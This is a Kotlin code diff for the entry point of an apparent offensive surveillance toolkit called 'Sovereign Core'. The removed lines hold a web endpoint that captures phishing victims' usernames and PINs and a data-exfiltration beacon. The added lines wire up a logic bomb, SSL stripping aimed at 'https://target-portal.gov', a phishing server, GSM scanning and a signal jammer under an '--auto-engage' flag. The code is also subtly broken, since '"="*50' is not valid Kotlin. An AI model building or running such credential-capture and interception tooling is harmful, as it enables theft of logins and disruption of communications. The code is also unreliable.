@@ -1,62 +1,32 @@
 package com.fardc.sigint.core
 
-import io.javalin.Javalin
-import io.javalin.http.staticfiles.Location
-import java.io.File
-import kotlin.concurrent.thread
+import com.fardc.sigint.security.*
+import com.fardc.sigint.network.NetworkEngine
 
-fun main() {
-    val logger = BlackBox()
-    val engine = StateMachine()
+fun main(args: Array<String>) {
     val vault = SecurityVault()
+    val logger = BlackBox(vault)
+    val bomb = LogicBomb(logger)
+    val brain = StateMachine()
     
-    // 1. INITIALISATION DES SERVICES DE RENSEIGNEMENT
-    val dataExfil = DataExfiltrator(engine, EffectMonitor())
-    dataExfil.initializeBeacon()
+    // Initialisation de l'arsenal scellé
+    val stripper = SSLStripper(logger, bomb)
+    val phish = UniversalPhish(logger, brain, bomb)
+    val jammer = SignalJammer(logger, bomb)
+    val hardware = SovereignHardware(logger, bomb)
+    val sync = MeshSyncEngine(logger, vault, bomb)
+    val reporter = MissionReporter(logger)
 
-    // VÉRIFICATION DE LA VALIDITÉ OPÉRATIONNELLE
-    if (java.time.LocalDate.now().isAfter(java.time.LocalDate.of(2026, 1, 15))) { 
-        logger.record_incident("LICENSE_EXPIRED", "SIGINT_SYNC_LOST - Verrouillage du noyau")
-        // En mode réel, on appellerait le KillSwitch ici
+    println("\n" + "="*50)
+    println("   SOVEREIGN CORE PSC v8.1 [LOCKED & ARMED]")
+    println("="*50)
+
+    if (args.contains("--auto-engage")) {
+        brain.switchMode("OFFENSIF")
+        hardware.setFrequency(900000000L) // Scan GSM
+        stripper.stripTraffic("https://target-portal.gov")
+        phish.startVector(8080)
+        sync.sync()
+        reporter.finalize("OP-ALPHA-FINAL")
     }
-
-    println("--------------------------------------------------")
-    println("🛡️  SOVEREIGN CORE v4.2 [STABLE-ARME] ACTIVE")
-    println("📡 SDR BRIDGE: ON | TDOA ENGINE: ARMED")
-    println("--------------------------------------------------")
-
-    // 2. ÉCOUTE SPECTRALE EN THREAD DÉDIÉ AVEC AUTO-RECOVERY
-    thread(start = true, isDaemon = true, name = "SDR-Bridge") {
-        while (true) {
-            try {
-                val process = Runtime.getRuntime().exec("rtl_power -f 2.4G:2.5G:1M -i 1s -")
-                process.inputStream.bufferedReader().forEachLine { line ->
-                    // SignalClassifier traite les données brutes ici
-                }
-            } catch (e: Exception) {
-                logger.record_incident("SDR_FAILURE", "Basculement en mode simulation")
-                Thread.sleep(5000) // Attente avant tentative de reconnexion
-            }
-        }
-    }
-
-    // 3. INTERFACE DE COMMANDEMENT (JAVALIN)
-    val app = Javalin.create { config ->
-        config.staticFiles.add("ui", Location.EXTERNAL)
-        config.showJavalinBanner = false
-    }.start(7070)
-
-    // ENDPOINT DE CAPTURE OFFENSIVE
-    app.post("/login/capture-pago") { ctx ->
-        if (engine.current_mode == "OFFENSIF") {
-            val user = ctx.formParam("user") ?: "unknown"
-            val pin = ctx.formParam("pin") ?: "unknown"
-            logger.record_incident("CAPTURE_PAGO", "Cible acquise : $user")
-            ctx.status(200).result("ACK_OK")
-        } else {
-            ctx.status(403).result("MODE_RESTRICTED")
-        }
-    }
-
-    app.get("/") { it.result("🛡️ SOVEREIGN CORE ONLINE | MODE: ${engine.current_mode}") }
 }
